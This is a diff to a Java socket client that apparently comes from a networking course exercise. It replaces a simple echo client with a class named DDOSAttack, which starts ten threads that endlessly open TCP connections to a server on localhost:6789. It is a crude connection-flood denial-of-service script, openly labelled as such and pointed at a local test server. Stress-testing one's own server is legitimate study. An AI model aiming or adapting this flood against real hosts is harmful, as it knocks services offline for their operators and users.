@@ -8,35 +8,38 @@ public class BadClient2{
     public static void main(String[]args)throws Exception{
         String sentence; // data to send to server
         String modifiedSentence; // received from server
+        int id=0;
+        while(id<10) {
+            System.out.println(++id);
+            // create a new thread object
+            DDOSAttack attack= new DDOSAttack ("localhost",6789);
+            // This thread will handle the client separately
+            new Thread(attack).start();
 
-        System.out.println("Client is running, enter some text:");
+        }
+    }
+    // DDOS class
+    private static class DDOSAttack implements Runnable {
+        private final String host;
+        private final int port;
 
-        // create input stream, client reads line from standard input
-        BufferedReader inFromUser = new BufferedReader(new InputStreamReader(System.in));
+        // Constructor
+        public DDOSAttack(String host,int port)
+        {
+            this.host = host;
+            this.port=port;
+        }
 
-        // create client socket and connect to server; this initiates TCP cnx between client and server
-        Socket clientSocket = new Socket("localhost", 6789);
+        public void run() {
+            while (true) {
+                try {
+                    // create client socket and connect to server; this initiates TCP cnx between client and server
+                    Socket clientSocket = new Socket(host, port);
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
 
-        // create output stream attached to socket
-        DataOutputStream outToServer = new DataOutputStream(clientSocket.getOutputStream());
-
-        // create input stream attached to socket
-        BufferedReader inFromServer = new BufferedReader(
-                new InputStreamReader(clientSocket.getInputStream()));
-
-        sentence = inFromUser.readLine(); // read line from user
-        outToServer.writeBytes(sentence + '\n'); //send line to server
-
-        /*
-        characters continue to accumulate in modifiedSentence until the line ends with a carriage return
-         */
-        modifiedSentence = inFromServer.readLine(); // read line from server
-
-        System.out.println("FROM SERVER: " + modifiedSentence);
-
-        clientSocket.close(); // close TCP cnx between client and server
-
-        System.out.println("Client closed the socket and is done execution");
-
+            }
+        }
     }
 }
